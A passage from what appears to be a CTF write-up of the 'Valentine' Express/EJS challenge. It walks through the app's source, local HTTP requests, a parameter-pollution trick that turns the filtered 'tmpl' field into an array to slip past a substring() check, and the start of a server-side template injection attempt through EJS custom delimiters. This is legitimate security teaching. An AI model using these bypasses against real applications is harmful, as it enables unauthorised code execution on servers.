  <span class="kd">let</span> <span class="nx">tmpl</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">tmpl</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">tmpl:</span><span class="dl">"</span><span class="o">+</span><span class="nx">tmpl</span><span class="p">)</span>
  <span class="k">while</span><span class="p">((</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;%</span><span class="dl">"</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">i: </span><span class="dl">"</span><span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> - </span><span class="dl">"</span> <span class="o">+</span><span class="nx">tmpl</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">11</span><span class="p">));</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">tmpl</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">11</span><span class="p">)</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">&lt;%= name %&gt;</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">message</span><span class="p">:</span><span class="dl">"</span><span class="s2">Only '&lt;%= name %&gt;' is allowed.</span><span class="dl">"</span><span class="p">});</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Bypassed!</span><span class="dl">"</span><span class="p">)</span>
  <span class="kd">let</span> <span class="nx">uuid</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomUUID</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">while </span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">))</span>

  <span class="k">try</span> <span class="p">{</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nf">writeFileSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">,</span> <span class="nx">tmpl</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to write Valentine's card</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">name</span> <span class="o">??</span> <span class="dl">''</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">?name=</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/:template</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">template</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">template</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="sr">/^</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{8}</span><span class="sr">-</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{4}</span><span class="sr">-</span><span class="se">[</span><span class="sr">4</span><span class="se">][</span><span class="sr">0-9A-F</span><span class="se">]{3}</span><span class="sr">-</span><span class="se">[</span><span class="sr">89AB</span><span class="se">][</span><span class="sr">0-9A-F</span><span class="se">]{3}</span><span class="sr">-</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{12}</span><span class="sr">$/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not a valid card id</span><span class="dl">"</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">template</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Valentine</span><span class="se">\'</span><span class="s1">s card does not exist</span><span class="dl">'</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">query</span><span class="p">[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
    <span class="nx">query</span><span class="p">[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span>
  <span class="p">}</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">name: </span><span class="dl">"</span><span class="o">+</span><span class="nx">query</span><span class="p">[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">query</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">./index.html</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">root</span><span class="p">:</span> <span class="nx">__dirname</span><span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3000</span><span class="p">);</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>Perfect! At this point, the docker environment should be ready. We can browse localhost on port 9086 and give a closer look at the application.</p>

<h3 id="the-application-at-a-glance-"><span class="me-2">The application at-a-glance üîç</span><a href="#the-application-at-a-glance-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The index page generates a basic HTML template that we can customize. At the bottom of the page, we can insert a name that will be inserted inside the template instead of the <code class="language-plaintext highlighter-rouge">&lt;%= name %&gt;</code> placeholder:</p>

<p><a href="/assets/img/valentine/valentine1.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine1.png" alt="" loading="lazy"></a></p>

<p>Proxying the traffic through Burpsuite, we can see that the template‚Äôs code is passed to the server inside the <code class="language-plaintext highlighter-rouge">tmpl</code> field alongside the specified name. Then the ‚Äúname‚Äù 
placeholder is replaced with the user-provided input, and the resulting output is shown onscreen.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded
...

tmpl=&lt;%= name %&gt;&amp;name=0xbro
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/valentine/valentine2.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine2.png" alt="" loading="lazy"></a></p>

<p>All the evidence points in the direction of a Server Side Template Injection vulnerability, but if we try to inject some math or some basic payloads, they are not evaluated but instead are reflected as they are. We can try to add other placeholders having different names, but they all get rejected by the backend.</p>

<p><a href="/assets/img/valentine/valentine3.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine3.png" alt="" loading="lazy"></a></p>

<p>If we want to add some other payload different from the original placeholder, we have to find a bypass to the security checks implemented by the application. To do that, we must give a closer look at the application source code, and luckily for us, we have everything we need.</p>

<h3 id="source-code-review"><span class="me-2">Source code review</span><a href="#source-code-review" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>As I said before, the <code class="language-plaintext highlighter-rouge">app.js</code> file is the application‚Äôs core. Scrolling through the source code, we can notice that the challenge uses <code class="language-plaintext highlighter-rouge">ejs</code> to manage views and that those views are stored inside the <code class="language-plaintext highlighter-rouge">/views</code> folder with a random uuid as the file name.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">crypto</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="nx">viewsFolder</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">);</span>

<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="nx">viewsFolder</span><span class="p">))</span> <span class="p">{</span>
  <span class="nx">fs</span><span class="p">.</span><span class="nf">mkdirSync</span><span class="p">(</span><span class="nx">viewsFolder</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">viewsFolder</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>

<span class="p">...</span>

<span class="kd">let</span> <span class="nx">uuid</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomUUID</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">while </span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">))</span>

  <span class="k">try</span> <span class="p">{</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nf">writeFileSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">,</span> <span class="nx">tmpl</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to write Valentine's card</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The content of those views, which are nothing more than template files, is copied from the <code class="language-plaintext highlighter-rouge">tmpl</code> body field, but before writing it inside the view file, the server checks for any placeholder different from the default one. If it finds a different value, it prints out the error message we saw before; otherwise, it writes <code class="language-plaintext highlighter-rouge">tmpl</code> inside the new view and then redirects us to that file.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/template</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">tmpl</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">tmpl</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">while</span><span class="p">((</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;%</span><span class="dl">"</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">tmpl</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">11</span><span class="p">)</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">&lt;%= name %&gt;</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">message</span><span class="p">:</span><span class="dl">"</span><span class="s2">Only '&lt;%= name %&gt;' is allowed.</span><span class="dl">"</span><span class="p">});</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  
  <span class="p">...</span>

  <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">name</span> <span class="o">??</span> <span class="dl">''</span><span class="p">;</span>
  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">?name=</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When we request a template file, the function verifies if the card has a valid code and exists, and if there were no problems, it renders the template using the data passed through the query string.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/:template</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">template</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">template</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="sr">/^</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{8}</span><span class="sr">-</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{4}</span><span class="sr">-</span><span class="se">[</span><span class="sr">4</span><span class="se">][</span><span class="sr">0-9A-F</span><span class="se">]{3}</span><span class="sr">-</span><span class="se">[</span><span class="sr">89AB</span><span class="se">][</span><span class="sr">0-9A-F</span><span class="se">]{3}</span><span class="sr">-</span><span class="se">[</span><span class="sr">0-9A-F</span><span class="se">]{12}</span><span class="sr">$/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not a valid card id</span><span class="dl">"</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="s2">`views/</span><span class="p">${</span><span class="nx">template</span><span class="p">}</span><span class="s2">.ejs`</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Valentine</span><span class="se">\'</span><span class="s1">s card does not exist</span><span class="dl">'</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">query</span><span class="p">[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
    <span class="nx">query</span><span class="p">[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">query</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Ok, so‚Ä¶ where is the bug?</p>

<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>To investigate the issue with a better perspective, I added inside the source code some debug print statements that show us the state of the user-supplied input before any key function. Then I rebuilt the docker image and started playing around with the parameters we can use.</p>

<h3 id="substring-bypass"><span class="me-2">substring() bypass</span><a href="#substring-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Our first effort was trying to bypass the security controls imposed by the server and be able to write arbitrary data inside a template.</p>

<p>One of my teammates noticed that by inserting twice the <code class="language-plaintext highlighter-rouge">tmpl</code> field inside the HTTP body, it was possible to pass to the server an array instead of a string, completely bypassing the security checks performed using the <code class="language-plaintext highlighter-rouge">substring()</code> method.</p>

<blockquote class="bug">
  <p><code class="language-plaintext highlighter-rouge">Substring()</code> is part of the <code class="language-plaintext highlighter-rouge">string</code> prototype and can be used only on <code class="language-plaintext highlighter-rouge">string</code> variables. In our case, however, we can pass to the method an <code class="language-plaintext highlighter-rouge">array</code>, forcing the <code class="language-plaintext highlighter-rouge">if</code> condition to result always <code class="language-plaintext highlighter-rouge">false</code>.</p>
</blockquote>

<p>PoC:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">tmpl</span> <span class="o">=</span> <span class="p">[</span> <span class="dl">'</span><span class="s1">&lt;%= asd %&gt;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&lt;%= asd %&gt;</span><span class="dl">'</span> <span class="p">]</span>
<span class="kd">var</span> <span class="nx">i</span>
<span class="k">while</span><span class="p">((</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;%</span><span class="dl">"</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">tmpl</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">i</span><span class="o">+</span><span class="mi">11</span><span class="p">)</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">&lt;%= name %&gt;</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">send</span><span class="p">({</span><span class="na">message</span><span class="p">:</span><span class="dl">"</span><span class="s2">Only '&lt;%= name %&gt;' is allowed.</span><span class="dl">"</span><span class="p">});</span>
	  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Caught!</span><span class="dl">'</span><span class="p">)</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">bypassed</span><span class="dl">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/valentine/valentine4.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine4.png" alt="" loading="lazy"></a></p>

<p>HTTP request:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded

tmpl=&lt;%= name %&gt;&amp;tmpl=&lt;%= name %&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Server response:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 32
ETag: W/"20-AGcAsG/itS23B2siUG6nl7RRo0A"
Date: Fri, 10 Mar 2023 20:27:20 GMT
Connection: close

Failed to write Valentine's card
</pre></td></tr></tbody></table></code></div></div>

<p>Server logs:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>```js
[ '&lt;%= name %&gt;', '&lt;%= name %&gt;' ]
TypeError [ERR_INVALID_ARG_TYPE]: The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received an instance of Array
    at Object.writeFileSync (node:fs:2222:5)
    at /app/app.js:36:8
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    at /app/node_modules/body-parser/lib/read.js:137:5 {
  code: 'ERR_INVALID_ARG_TYPE
</pre></td></tr></tbody></table></code></div></div>

<p>Unfortunately, we were unable to proceed further because we required an instance of Buffer, TypedArray, or DataView instead of an Array, so we moved further, looking for some other bugs.</p>

<h3 id="ssti-using-ejs-custom-delimiters"><span class="me-2">SSTI using EJS custom delimiters</span><a href="#ssti-using-ejs-custom-delimiters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Using the same logic, I tried passing to the template some non-string parameters, noticing that we weren‚Äôt limited to using only string values, but we were also able to pass arrays or objects to the server.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>GET /991a04f8-fecd-42f9-af93-31d29f13420c?name[root]=/tmp&amp;name[foo]=pippo
Host: 127.0.0.1:9086


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 15
ETag: W/"f-wdRP8Dr/E3KFbCgYVPRU4uHRW3w"
Date: Fri, 10 Mar 2023 20:19:12 GMT
Connection: close

[object Object]
</pre></td></tr></tbody></table></code></div></div>

<pre><code class="language-txt">[+] Log: { root: '/tmp', foo: 'pippo' }
</code></pre>

<p>With that in mind, we started looking at the EJS documentation and older vulnerabilities, searching for clues to proceed further.</p>

<p>The official EJS documentation <sup id="fnref:1"><a href="#fn:1" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> pointed us to some very interesting <strong>options</strong> and <strong>features</strong>. Among them, the one that made our curiosity clicks was the support for <strong>custom delimiters</strong>.</p>

<p><a href="/assets/img/valentine/valentine5.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine5.png" alt="" loading="lazy"></a></p>

